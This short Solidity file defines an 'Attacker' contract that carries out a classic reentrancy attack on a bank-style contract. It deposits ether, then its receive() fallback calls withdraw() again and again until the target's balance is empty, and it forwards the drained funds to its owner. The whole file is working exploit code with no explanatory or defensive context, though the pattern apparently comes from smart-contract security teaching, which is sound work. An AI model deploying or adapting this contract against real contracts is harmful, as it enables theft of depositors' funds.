// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IBank {
    function deposit() external payable;

    function withdraw() external;
}

contract Attacker {
    IBank public immutable bank;
    address public owner;

    constructor(address _bank) {
        bank = IBank(_bank);
        owner = msg.sender;
    }

    function execute() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw();
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}
